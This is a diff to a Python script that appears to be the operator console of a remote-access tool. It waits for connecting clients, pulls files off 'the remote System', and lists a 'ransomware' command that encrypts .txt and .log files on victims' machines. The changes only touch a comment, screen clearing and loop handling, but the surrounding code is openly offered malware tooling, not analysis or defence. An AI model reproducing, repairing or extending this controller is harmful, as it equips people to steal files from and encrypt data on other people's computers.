@@ -46,7 +46,7 @@ while True:
             print('[h, help] Displays this help\n[down. download] Usage <down> lets you download files from the remote System\n[rw, encrypt, ransomware] Usage <rw, encrypt, ransomware> encrypts all .txt, .log files on the remote system, you can add more extensions if you want')
             continue
 
-        # This will close the connection
+        # This will close the connection because tcp doesnt know when the end of the file is reached so it keeps waiting for data which means the shell cannot be used anymore and it has to be killed
         if cmd.lower() in ['down', 'download']:
             yesNo = input('This will close the connection are you sure you want to do this? Y/n\n')
             if yesNo.lower() in ['y', 'yes']:
@@ -66,7 +66,8 @@ while True:
                         bytes_recv = client[0].recv(1024)
                 print('Download complete closing...')
                 client[0].close()
-                s.close()
+                print("\033c", end='')
+                break
                 sys.stderr = object
             else:
                 client[0].send('n'.encode())
@@ -95,6 +96,7 @@ while True:
     client[0].close()
 
     cmd = input('Wait for new client Y/n ') or 'y'
+    print("\033c", end='')
     if cmd.lower() in ['n', 'no']:
         break
 
